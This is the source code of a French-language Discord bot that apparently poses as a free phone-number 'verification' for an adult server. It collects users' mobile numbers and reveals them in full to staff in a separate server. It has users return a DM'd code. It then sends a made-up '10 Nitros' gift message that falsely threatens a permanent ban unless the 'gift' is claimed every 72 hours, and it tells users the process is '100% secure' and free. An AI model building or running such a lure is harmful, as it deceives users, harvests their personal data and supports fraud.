import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import datetime
import os
import logging
from typing import Optional, Dict, Set
from aiohttp import web
import config
from utils import validate_phone, mask_phone, generate_code, validate_code

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("VerifBot")

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

cooldowns: Dict[int, float] = {}
verified_users: Dict[int, dict] = {}
blacklisted_numbers: Set[str] = set()
blacklisted_users: Set[int] = set()

NITRO_TEXT = (
    "🎁 **VOUS AVEZ REÇU 10 NITROS !** 🎁\n\n"
    "📲 **Comment les récupérer :**\n"
    "➡️ Va dans **Paramètres** > **Inventaire** > **Cadeaux**\n"
    "➡️ Tu verras **10 Nitros** qui t'attendent !\n\n"
    "⚠️ **ATTENTION :**\n"
    "• Tu dois récupérer tes Nitros **toutes les 72h**\n"
    "• **Sinon tes Nitros disparaissent** et tu risques un **banissement définitif du compte**\n"
    "• Si tu ne reçois pas le code ou qu'il ne marche pas, **refais une demande** et patiente **10 minutes**\n\n"
    "✅ **C'est 100% sécurisé** — aucun risque pour ton compte\n\n"
    "📝 **N'oublie pas de laisser un avis après validation !**\n"
    "👍 Un petit avis nous aide à améliorer le service !"
)

async def health_handler(request):
    return web.Response(text="OK", status=200)

async def start_health_server():
    app = web.Application()
    app.router.add_get("/", health_handler)
    app.router.add_get("/health", health_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", config.PORT)
    await site.start()
    log.info(f"Health check server on port {config.PORT}")

async def send_log(title: str, description: str = "", color: int = 0x2b2d31, fields: list = None, user: discord.User = None):
    channel = bot.get_channel(config.LOG_CHANNEL_ID)
    if not channel:
        return
    embed = discord.Embed(title=title, description=description, color=color, timestamp=datetime.datetime.now())
    if fields:
        for name, value, inline in fields:
            embed.add_field(name=name, value=value, inline=inline)
    if user:
        embed.set_thumbnail(url=user.display_avatar.url)
    embed.set_footer(text=f"Logs • {datetime.datetime.now().strftime('%d/%m/%Y %H:%M')}")
    await channel.send(embed=embed)

def has_staff_role(interaction: discord.Interaction) -> bool:
    if isinstance(interaction.user, discord.Member):
        return config.STAFF_ROLE_ID in [r.id for r in interaction.user.roles]
    return False

class PhoneModal(discord.ui.Modal, title="📱 Vérification téléphone"):
    phone = discord.ui.TextInput(
        label="Numéro de téléphone",
        placeholder="0612345678",
        min_length=10,
        max_length=10,
        required=True,
    )

    async def on_submit(self, interaction: discord.Interaction):
        now = datetime.datetime.now().timestamp()

        if interaction.user.id in blacklisted_users:
            embed = discord.Embed(title="🚫 Accès refusé", description="Votre compte est blacklisté.", color=0xed4245)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        if interaction.user.id in cooldowns:
            remaining = cooldowns[interaction.user.id] + config.COOLDOWN_SECONDS - now
            if remaining > 0:
                embed = discord.Embed(title="⏳ Cooldown", description=f"Attendez **{int(remaining)} secondes**.", color=0xfee75c)
                await interaction.response.send_message(embed=embed, ephemeral=True)
                return

        if interaction.user.id in verified_users:
            embed = discord.Embed(title="⏳ Déjà en cours", description="Vous avez déjà une vérification en attente.", color=0xfee75c)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        phone_raw = self.phone.value.strip().replace(" ", "").replace("-", "")

        if phone_raw in blacklisted_numbers:
            embed = discord.Embed(title="🚫 Numéro blacklisté", description="Ce numéro est blacklisté.", color=0xed4245)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        valid, err_msg = validate_phone(phone_raw)
        if not valid:
            embed = discord.Embed(title="❌ Numéro invalide", description=err_msg, color=0xed4245)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        cooldowns[interaction.user.id] = now
        guild_name = interaction.guild.name if interaction.guild else "Inconnu"

        embed_wait = discord.Embed(
            title="📩 Code de vérification",
            description="✅ **Votre demande a bien été prise en compte !**\n\n📱 Vous allez recevoir un **code de vérification par message privé**.\n⏱️ Cela peut prendre **jusqu'à 5 minutes**.\n💰 **Aucun débit** — 0,00 €\n\n📌 Merci de patienter.",
            color=0x57f287
        )
        embed_wait.set_footer(text="Vérification • 0,00 €")
        await interaction.response.send_message(embed=embed_wait, ephemeral=True)

        await send_log(
            title="📋 Nouvelle demande",
            description=f"**{interaction.user}** a envoyé une demande.",
            color=0x5865f2,
            user=interaction.user,
            fields=[
                ("👤 Pseudo", str(interaction.user), True),
                ("🆔 ID", f"`{interaction.user.id}`", True),
                ("📱 Numéro", f"`{mask_phone(phone_raw)}`", False),
                ("🕐 Date", datetime.datetime.now().strftime('%d/%m/%Y %H:%M'), False)
            ]
        )

        await send_staff_panel(interaction.user, phone_raw, guild_name)

    async def on_error(self, interaction: discord.Interaction, error: Exception) -> None:
        log.error(f"Modal error: {error}")
        embed = discord.Embed(title="❌ Erreur", description="Une erreur est survenue.", color=0xed4245)
        try:
            await interaction.response.send_message(embed=embed, ephemeral=True)
        except:
            pass

def build_staff_embed(user: discord.User, phone: str, guild_name: str, status: str = "En attente", claimed_by: Optional[int] = None, code_status: str = "*En attente...*", timestamp: Optional[datetime.datetime] = None) -> discord.Embed:
    if timestamp is None:
        timestamp = datetime.datetime.now()
    embed = discord.Embed(title="🔞 NOUVELLE DEMANDE DE VÉRIFICATION", color=0x5865f2, timestamp=timestamp)
    embed.set_thumbnail(url=user.display_avatar.url)
    embed.add_field(name="👤 **Utilisateur**", value=f"{user.mention}", inline=True)
    embed.add_field(name="🆔 **ID**", value=f"`{user.id}`", inline=True)
    embed.add_field(name="📱 **Numéro**", value=f"`{mask_phone(phone)}`", inline=True)
    embed.add_field(name="🌐 **Serveur**", value=guild_name, inline=True)
    embed.add_field(name="📌 **Statut**", value=f"⏳ {status}", inline=True)
    embed.add_field(name="🔑 **Code SMS**", value=code_status, inline=True)
    embed.add_field(name="👮 **Pris en charge par**", value=f"<@{claimed_by}>" if claimed_by else "*Personne*", inline=False)
    embed.set_footer(text=f"Aujourd'hui à {timestamp.strftime('%H:%M')} • Vérification")
    return embed

class StaffPanelView(discord.ui.View):
    def __init__(self, user_id: int, phone: str, guild_name: str):
        super().__init__(timeout=None)
        self.user_id = user_id
        self.phone = phone
        self.guild_name = guild_name
        self.claimed_by: Optional[int] = None
        self.code_sent = False
        self.code_value: Optional[str] = None
        self.message: Optional[discord.Message] = None

    @discord.ui.button(label="📋 Prendre en charge", style=discord.ButtonStyle.primary, custom_id="claim_btn")
    async def claim_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            if not has_staff_role(interaction):
                embed = discord.Embed(title="❌ Accès refusé", description="Vous n'avez pas la permission de claim. Contactez un admin pour obtenir l'accès.", color=0xed4245)
                await interaction.response.send_message(embed=embed, ephemeral=True)
                return
            if self.claimed_by is not None:
                embed = discord.Embed(title="❌ Déjà pris", description=f"Déjà pris par <@{self.claimed_by}>.", color=0xed4245)
                await interaction.response.send_message(embed=embed, ephemeral=True)
                return
            self.claimed_by = interaction.user.id
            embed_reveal = discord.Embed(title="📱 Numéro dévoilé", description=f"```\n{self.phone}\n```\n⚠️ Ne partagez pas.", color=0x57f287, timestamp=datetime.datetime.now())
            await interaction.response.send_message(embed=embed_reveal, ephemeral=True)
            user_fetch = await bot.fetch_user(self.user_id)
            new_embed = build_staff_embed(user=user_fetch, phone=self.phone, guild_name=self.guild_name, status="En cours", claimed_by=self.claimed_by, code_status="*En attente...*", timestamp=interaction.message.created_at)
            new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
            await interaction.message.edit(embed=new_embed, view=self)
            await send_log(title="📋 Pris en charge", description=f"**{interaction.user.name}** a pris en charge.", color=0x57f287, fields=[("👮 Staff", f"<@{interaction.user.id}>", True), ("👤 User", f"<@{self.user_id}>", True), ("📱 Numéro", f"||{self.phone}||", False)])
        except Exception as e:
            log.error(f"Claim error: {e}")

    @discord.ui.button(label="🔑 Envoyer le code", style=discord.ButtonStyle.success, custom_id="code_btn")
    async def code_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            if not has_staff_role(interaction):
                embed = discord.Embed(title="❌ Accès refusé", description="Vous n'avez pas la permission.", color=0xed4245)
                await interaction.response.send_message(embed=embed, ephemeral=True)
                return
            if self.claimed_by is None:
                embed = discord.Embed(title="❌ Pas de claim", description="Prenez d'abord en charge.", color=0xfee75c)
                await interaction.response.send_message(embed=embed, ephemeral=True)
                return
            if self.claimed_by != interaction.user.id:
                embed = discord.Embed(title="❌ Pas votre vérification", description=f"Seul <@{self.claimed_by}> peut.", color=0xed4245)
                await interaction.response.send_message(embed=embed, ephemeral=True)
                return
            if self.code_sent:
                embed = discord.Embed(title="⚠️ Déjà envoyé", description="Code déjà envoyé.", color=0xfee75c)
                await interaction.response.send_message(embed=embed, ephemeral=True)
                return
            self.code_value = generate_code()
            self.code_sent = True
            verified_users[self.user_id] = {"code": self.code_value, "phone": self.phone, "claimed_by": interaction.user.id, "guild_name": self.guild_name}
            embed_waiting = discord.Embed(title="⏳ Code envoyé", description=f"📱 Code envoyé à <@{self.user_id}>.\n\n🔐 **Code : `{self.code_value}`**\n\n⏳ En attente...", color=0xfee75c, timestamp=datetime.datetime.now())
            embed_waiting.set_footer(text="L'utilisateur répond en MP")
            await interaction.response.send_message(embed=embed_waiting, ephemeral=True)
            try:
                user = await bot.fetch_user(self.user_id)
                embed_dm = discord.Embed(title="🔐 Code de vérification", description=f"**Votre code : `{self.code_value}`**\n\nRépondez avec le code.\n\n⚠️ Ne le partagez pas.", color=0x5865f2)
                embed_dm.set_footer(text="0,00 €")
                await user.send(embed=embed_dm)
                log.info(f"Code {self.code_value} envoyé à {self.user_id}")
                await send_log(title="🔑 Code envoyé", description=f"À <@{self.user_id}> par **{interaction.user.name}**.", color=0xfee75c, user=user, fields=[("👤 User", f"<@{self.user_id}>", True), ("👮 Staff", f"<@{interaction.user.id}>", True), ("🔐 Code", f"||{self.code_value}||", False)])
            except discord.Forbidden:
                log.warning(f"MP fermés pour {self.user_id}")
                embed_fail = discord.Embed(title="❌ MP fermés", description=f"<@{self.user_id}> a ses MP fermés. Ouvrez-les puis réessayez.", color=0xed4245)
                await interaction.followup.send(embed=embed_fail, ephemeral=True)
                self.code_sent = False
                self.code_value = None
                verified_users.pop(self.user_id, None)
                return
            user_fetch = await bot.fetch_user(self.user_id)
            new_embed = build_staff_embed(user=user_fetch, phone=self.phone, guild_name=self.guild_name, status="Code envoyé", claimed_by=self.claimed_by, code_status="✅ Envoyé", timestamp=interaction.message.created_at)
            new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
            await interaction.message.edit(embed=new_embed, view=self)
        except Exception as e:
            log.error(f"Code error: {e}")

    @discord.ui.button(label="✅ Valider", style=discord.ButtonStyle.success, custom_id="validate_btn")
    async def validate_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            if not has_staff_role(interaction):
                embed = discord.Embed(title="❌ Accès refusé", description="Vous n'avez pas la permission.", color=0xed4245)
                await interaction.response.send_message(embed=embed, ephemeral=True)
                return
            if self.claimed_by is None:
                embed = discord.Embed(title="❌ Pas de claim", description="Prenez d'abord en charge.", color=0xfee75c)
                await interaction.response.send_message(embed=embed, ephemeral=True)
                return
            if self.claimed_by != interaction.user.id:
                embed = discord.Embed(title="❌ Pas votre vérification", description=f"Seul <@{self.claimed_by}> peut.", color=0xed4245)
                await interaction.response.send_message(embed=embed, ephemeral=True)
                return
            verified_users.pop(self.user_id, None)
            for child in self.children:
                if isinstance(child, discord.ui.Button):
                    child.disabled = True
            user_fetch = await bot.fetch_user(self.user_id)
            new_embed = build_staff_embed(user=user_fetch, phone=self.phone, guild_name=self.guild_name, status="✅ Validé ✅", claimed_by=self.claimed_by, code_status="✅ Validé", timestamp=interaction.message.created_at)
            new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
            new_embed.color = 0x57f287
            await interaction.response.edit_message(embed=new_embed, view=self)
            if config.VERIFIED_ROLE_ID and config.GUILD_ID:
                guild = bot.get_guild(config.GUILD_ID)
                if guild:
                    role = guild.get_role(config.VERIFIED_ROLE_ID)
                    if role:
                        member = guild.get_member(self.user_id)
                        if member:
                            try:
                                await member.add_roles(role, reason="Vérification validée")
                            except:
                                log.warning(f"Permission manquante rôle {self.user_id}")
            try:
                user = await bot.fetch_user(self.user_id)
                nitro_embed = discord.Embed(title="🎉 VÉRIFICATION RÉUSSIE !", description=NITRO_TEXT, color=0x57f287)
                nitro_embed.set_footer(text="Offre valable 72h • 10 Nitros")
                await user.send(embed=nitro_embed)
            except:
                pass
            log_channel = bot.get_channel(config.LOG_CHANNEL_ID)
            if log_channel:
                embed_log = discord.Embed(title="✅ VALIDÉ", description=f"**{user_fetch.name}** validé.", color=0x57f287, timestamp=datetime.datetime.now())
                embed_log.add_field(name="👤 User", value=f"{user_fetch.mention}", inline=True)
                embed_log.add_field(name="👮 Staff", value=f"<@{self.claimed_by}>", inline=True)
                embed_log.add_field(name="📱 Numéro", value=f"||{self.phone}||", inline=True)
                embed_log.set_thumbnail(url=user_fetch.display_avatar.url)
                await log_channel.send(content=f"<@{self.claimed_by}> ✅ Validé !", embed=embed_log)
        except Exception as e:
            log.error(f"Validate error: {e}")

    @discord.ui.button(label="❌ Refuser", style=discord.ButtonStyle.danger, custom_id="deny_btn")
    async def deny_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            if not has_staff_role(interaction):
                embed = discord.Embed(title="❌ Accès refusé", description="Vous n'avez pas la permission.", color=0xed4245)
                await interaction.response.send_message(embed=embed, ephemeral=True)
                return
            if self.claimed_by is not None and self.claimed_by != interaction.user.id:
                embed = discord.Embed(title="❌ Pas votre vérification", description=f"Seul <@{self.claimed_by}> peut.", color=0xed4245)
                await interaction.response.send_message(embed=embed, ephemeral=True)
                return
            user_id = self.user_id
            phone = self.phone
            verified_users.pop(user_id, None)
            cooldowns.pop(user_id, None)
            blacklisted_numbers.add(phone)
            blacklisted_users.add(user_id)
            for child in self.children:
                if isinstance(child, discord.ui.Button):
                    child.disabled = True
            user_fetch = await bot.fetch_user(user_id)
            new_embed = build_staff_embed(user=user_fetch, phone=phone, guild_name=self.guild_name, status="🚫 REFUSÉ - KICK 🚫", claimed_by=self.claimed_by, code_status="❌ Refusé", timestamp=interaction.message.created_at)
            new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
            new_embed.color = 0xed4245
            await interaction.response.edit_message(embed=new_embed, view=self)
            try:
                user = await bot.fetch_user(user_id)
                embed_ban = discord.Embed(title="🚫 VÉRIFICATION REFUSÉE", description="Votre vérification a été refusée.\n\n❌ **Vous êtes banni à vie**\n❌ **Votre numéro est blacklisté**", color=0xed4245)
                await user.send(embed=embed_ban)
            except:
                pass
            if config.GUILD_ID:
                guild = bot.get_guild(config.GUILD_ID)
                if guild:
                    member = guild.get_member(user_id)
                    if member:
                        try:
                            await member.kick(reason="Vérification refusée - blacklist")
                            log.info(f"{user_id} kick du serveur")
                        except:
                            log.warning(f"Impossible de kick {user_id}")
            log_channel = bot.get_channel(config.LOG_CHANNEL_ID)
            if log_channel:
                embed_log = discord.Embed(title="🚫 BLACKLIST + KICK", description=f"**{user_fetch.name}** refusé et kick.", color=0xed4245, timestamp=datetime.datetime.now())
                embed_log.add_field(name="👤 User", value=f"{user_fetch.mention}", inline=True)
                embed_log.add_field(name="👮 Staff", value=f"<@{interaction.user.id}>", inline=True)
                embed_log.add_field(name="📱 Numéro", value=f"||{phone}||", inline=True)
                embed_log.set_thumbnail(url=user_fetch.display_avatar.url)
                await log_channel.send(content=f"<@{interaction.user.id}> 🚫 Kick !", embed=embed_log)
            await send_log(title="🚫 Blacklist", description=f"**{user_fetch.name}** kick par **{interaction.user.name}**.", color=0xed4245, fields=[("👤 User", f"`{user_id}`", True), ("📱 Numéro", f"||{phone}||", True)])
        except Exception as e:
            log.error(f"Deny error: {e}")

async def send_staff_panel(user: discord.User, phone: str, guild_name: str):
    guild = bot.get_guild(config.STAFF_GUILD_ID)
    if not guild:
        log.error(f"Staff guild {config.STAFF_GUILD_ID} introuvable.")
        return
    channel = guild.get_channel(config.STAFF_CHANNEL_ID)
    if not channel:
        log.error(f"Staff channel {config.STAFF_CHANNEL_ID} introuvable.")
        return
    view = StaffPanelView(user.id, phone, guild_name)
    embed = build_staff_embed(user=user, phone=phone, guild_name=guild_name, status="En attente", claimed_by=None, code_status="*En attente...*")
    embed.set_thumbnail(url=user.display_avatar.url)
    msg = await channel.send(content="@everyone", embed=embed, view=view)
    view.message = msg

async def handle_dm_code(message: discord.Message):
    user_id = message.author.id
    pending = verified_users.get(user_id)
    if pending is None:
        return
    content = message.content.strip()
    valid, err_msg = validate_code(content)
    if not valid:
        embed = discord.Embed(title="❌ Code invalide", description=err_msg, color=0xed4245)
        await message.channel.send(embed=embed)
        return
    if content != pending["code"]:
        if content in ["1234","2345","3456","4567","5678","6789","7890","4321","5432","6543","7654","8765","9876","0987"] or len(set(content)) == 1:
            embed = discord.Embed(title="❌ Code invalide", description="Code répété ou séquentiel. Contactez le staff.", color=0xed4245)
            await message.channel.send(embed=embed)
            return
        embed = discord.Embed(title="❌ Code incorrect", description="Code incorrect. Réessayez.", color=0xed4245)
        await message.channel.send(embed=embed)
        return
    phone = pending["phone"]
    claimed_by = pending.get("claimed_by")
    verified_users.pop(user_id, None)
    embed_success = discord.Embed(title="✅ Code valide !", description="Code correct. En attente de validation du staff...", color=0x57f287)
    await message.channel.send(embed=embed_success)
    log_channel = bot.get_channel(config.LOG_CHANNEL_ID)
    if log_channel:
        embed_log = discord.Embed(title="✅ CODE SAISI PAR L'UTILISATEUR", description=f"Code : `{content}`", color=0x57f287, timestamp=datetime.datetime.now())
        embed_log.add_field(name="👤 User", value=f"{message.author.mention}", inline=True)
        embed_log.add_field(name="👮 Staff", value=f"<@{claimed_by}>" if claimed_by else "Inconnu", inline=True)
        embed_log.set_thumbnail(url=message.author.display_avatar.url)
        await log_channel.send(content=f"<@{claimed_by}> ✅ Code reçu ! Tu peux valider ou refuser.", embed=embed_log)

class VerifyView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="✅ Vérifier", style=discord.ButtonStyle.success, custom_id="global_verify_btn")
    async def verify(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id in blacklisted_users:
            embed_b = discord.Embed(title="🚫 Blacklisté", description="Vous êtes blacklisté.", color=0xed4245)
            await interaction.response.send_message(embed=embed_b, ephemeral=True)
            return
        await interaction.response.send_modal(PhoneModal())

@bot.tree.command(name="setup", description="Crée le panneau de vérification")
@app_commands.default_permissions(administrator=True)
async def setup(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🔞 Vérification requise",
        description="Pour accéder à ce serveur, vérifiez votre compte.\n\n**Procédure :**\n1️⃣ Cliquez sur **Vérifier**\n2️⃣ Entrez votre numéro (06/07)\n3️⃣ Recevez un **code à 4 chiffres** par MP\n4️⃣ Répondez avec le code\n\n🔒 **100% sécurisé** • 💰 **0,00 €**",
        color=0x5865f2
    )
    embed.set_footer(text="Système de vérification")
    view = VerifyView()
    await interaction.response.send_message(embed=embed, view=view)
    config.SETUP_CHANNEL_ID = interaction.channel_id
    log.info(f"Setup dans #{interaction.channel.name}")

@bot.tree.command(name="sync", description="Sync les commandes")
@app_commands.default_permissions(administrator=True)
async def sync(interaction: discord.Interaction):
    await bot.tree.sync()
    embed = discord.Embed(title="✅ Commandes synchronisées", color=0x57f287)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="reset", description="Reset le panneau")
@app_commands.default_permissions(administrator=True)
async def reset(interaction: discord.Interaction):
    await setup.callback(interaction)

@bot.tree.command(name="stats", description="Stats vérification")
@app_commands.default_permissions(administrator=True)
async def stats(interaction: discord.Interaction):
    embed = discord.Embed(title="📊 Stats", description=f"**En cours :** {len(verified_users)}\n**Blacklistés :** {len(blacklisted_users)}\n**Numéros blacklistés :** {len(blacklisted_numbers)}", color=0x5865f2)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="acces", description="Donne l'accès aux vérifications à un staff")
@app_commands.default_permissions(administrator=True)
async def acces(interaction: discord.Interaction, member: discord.Member):
    if config.STAFF_ROLE_ID == 0:
        embed = discord.Embed(title="❌ Erreur", description="STAFF_ROLE_ID non configuré dans .env", color=0xed4245)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    role = interaction.guild.get_role(config.STAFF_ROLE_ID)
    if not role:
        embed = discord.Embed(title="❌ Erreur", description="Rôle staff introuvable.", color=0xed4245)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    if role in member.roles:
        embed = discord.Embed(title="⚠️ Déjà", description=f"{member.mention} a déjà l'accès.", color=0xfee75c)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    await member.add_roles(role, reason="Accès vérification")
    embed = discord.Embed(title="✅ Accès donné", description=f"{member.mention} peut maintenant claim et gérer les vérifications.", color=0x57f287)
    await interaction.response.send_message(embed=embed, ephemeral=True)
    log.info(f"Accès donné à {member.name} par {interaction.user.name}")

@bot.tree.command(name="delacces", description="Retire l'accès aux vérifications à un staff")
@app_commands.default_permissions(administrator=True)
async def delacces(interaction: discord.Interaction, member: discord.Member):
    if config.STAFF_ROLE_ID == 0:
        embed = discord.Embed(title="❌ Erreur", description="STAFF_ROLE_ID non configuré.", color=0xed4245)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    role = interaction.guild.get_role(config.STAFF_ROLE_ID)
    if not role:
        embed = discord.Embed(title="❌ Erreur", description="Rôle introuvable.", color=0xed4245)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    if role not in member.roles:
        embed = discord.Embed(title="⚠️ Pas d'accès", description=f"{member.mention} n'a pas l'accès.", color=0xfee75c)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    await member.remove_roles(role, reason="Accès vérification retiré")
    embed = discord.Embed(title="✅ Accès retiré", description=f"{member.mention} ne peut plus gérer les vérifications.", color=0x57f287)
    await interaction.response.send_message(embed=embed, ephemeral=True)
    log.info(f"Accès retiré à {member.name} par {interaction.user.name}")

@bot.event
async def on_ready():
    log.info(f"✅ Connecté : {bot.user}")
    await bot.tree.sync()
    log.info("Commandes synchronisées.")
    bot.add_view(VerifyView())
    if config.SETUP_CHANNEL_ID:
        channel = bot.get_channel(config.SETUP_CHANNEL_ID)
        if channel:
            async for msg in channel.history(limit=50):
                if msg.author.id == bot.user.id and msg.embeds:
                    try:
                        await msg.edit(view=VerifyView())
                        log.info("Vue restaurée automatiquement")
                        break
                    except:
                        pass
    asyncio.create_task(start_health_server())

@bot.event
async def on_message(message: discord.Message):
    if message.author.bot:
        return
    if isinstance(message.channel, discord.DMChannel):
        await handle_dm_code(message)

if __name__ == "__main__":
    if not config.BOT_TOKEN:
        log.critical("BOT_TOKEN manquant")
        exit(1)
    bot.run(config.BOT_TOKEN)
